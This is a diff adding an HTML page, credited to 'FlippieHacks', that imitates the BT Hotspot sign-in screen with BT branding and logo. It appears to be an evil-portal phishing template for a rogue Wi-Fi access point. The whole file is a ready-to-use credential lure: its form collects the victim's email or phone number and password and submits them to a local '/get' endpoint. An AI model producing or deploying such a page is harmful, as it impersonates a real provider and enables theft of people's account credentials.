@@ -1,0 +1,158 @@
+<!--By FlippieHacks
+https://github.com/FlippieHacks/ -->
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #FFFFFF;
+}
+
+.container {
+  max-width: 400px;
+  margin: 0 auto;
+  padding: 20px;
+}
+
+@media (min-width: 600px) {
+  .container {
+    max-width: 500px;
+  }
+}
+
+.logo-container {
+  text-align: center;
+  margin-bottom: 30px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.logo {
+  width: 40px;
+  height: 40px;
+  fill: #540cb5;
+  margin-right: 100px
+}
+
+.bt-name {
+  font-size: 42px;
+  color: #540cb5;
+  margin-left: 10px;
+}
+
+.form-container {
+  background: #FFFFFF;
+  border: 1px solid #FFFFFF;
+  border-radius: 4px;
+  padding: 20px;
+  box-shadow: 0px 0px 10px 0px rgba(108,66,156,0.2);
+}
+
+h1 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #000000;
+  margin-bottom: 20px;
+}
+
+h2 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #000000;
+  margin-bottom: 20px;
+}
+
+.input-field {
+  width: 100%;
+  padding: 12px;
+  border: 2px solid #540cb5;
+  border-radius: 4px;
+  box-sizing: border-box;
+  margin-bottom: 20px;
+  font-size: 14px;
+}
+
+.submit-btn {
+  background: #540cb5;
+  border: none;
+  color: #FFFFFF;
+  padding: 12px 20px;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+}
+
+.submit-btn:hover {
+  background: #540cb5;
+}
+
+
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="logo-container">
+  <svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="65.000000pt" height="65.000000pt" viewBox="0 0 1200.000000 1200.000000"
+ preserveAspectRatio="xMidYMid meet">
+<g transform="translate(0.000000,1200.000000) scale(0.100000,-0.100000)"
+fill="#540cb5" stroke="none">
+<path d="M5540 11989 c-1192 -95 -2307 -528 -3240 -1258 -516 -404 -982 -912
+-1332 -1451 -412 -634 -708 -1355 -852 -2080 -83 -415 -116 -755 -116 -1200 0
+-414 27 -725 96 -1100 454 -2468 2421 -4403 4901 -4821 308 -52 525 -70 894
+-76 635 -10 1142 52 1719 211 1609 443 2988 1572 3744 3066 340 672 536 1339
+622 2120 22 199 30 790 15 1014 -107 1525 -778 2935 -1890 3973 -891 832
+-2022 1379 -3211 1553 -311 45 -415 52 -830 55 -223 2 -457 -1 -520 -6z m855
+-750 c1237 -87 2429 -635 3319 -1525 725 -726 1215 -1626 1431 -2629 79 -367
+109 -674 109 -1090 0 -325 -8 -457 -45 -725 -192 -1384 -926 -2632 -2047
+-3478 -1152 -871 -2613 -1227 -4039 -987 -828 140 -1605 474 -2278 978 -379
+284 -764 668 -1047 1043 -569 755 -915 1619 -1029 2571 -27 227 -37 739 -20
+971 70 913 354 1751 848 2506 328 500 745 947 1224 1311 566 431 1223 745
+1913 915 551 136 1080 180 1661 139z"/>
+<path d="M3000 6011 l0 -2051 878 0 c868 0 984 4 1140 36 305 62 585 230 757
+454 164 214 242 474 232 775 -8 222 -54 379 -161 546 -56 86 -220 253 -288
+293 l-47 28 82 81 c134 134 220 283 268 464 29 110 37 345 16 468 -86 491
+-453 832 -1002 932 -78 14 -210 17 -982 20 l-893 4 0 -2050z m1609 1216 c92
+-27 157 -65 210 -122 65 -72 93 -145 94 -245 1 -224 -135 -361 -391 -390 -48
+-5 -201 -10 -339 -10 l-253 0 0 396 0 396 313 -5 c244 -3 324 -8 366 -20z m-6
+-1610 c132 -38 236 -116 277 -210 60 -137 40 -309 -49 -409 -45 -51 -121 -98
+-199 -121 -59 -18 -103 -21 -384 -25 l-318 -4 0 397 0 397 308 -5 c243 -3 319
+-8 365 -20z"/>
+<path d="M6320 7585 l0 -475 460 0 460 0 0 -1570 0 -1570 495 0 495 0 0 1570
+0 1570 480 0 480 0 0 475 0 475 -1435 0 -1435 0 0 -475z"/>
+</g>
+</svg>
+
+
+    <div class="bt-name">HOTSPOT</div>
+  </div>
+
+  <div class="form-container">
+
+    <center><h1>Sign in with your BT account</h1>
+      </center>
+
+    <form action="/get" id="login-form">
+    
+      <input name="email" class="input-field" type="text" placeholder="Email or mobile phone number" required>
+      
+      <input name="password" class="input-field" type="password" placeholder="Password" required>
+
+      <button class="submit-btn" type="submit">Continue</button>
+
+    </form>
+
+  </div>
+
+</div>
+
+</body>
+</html>
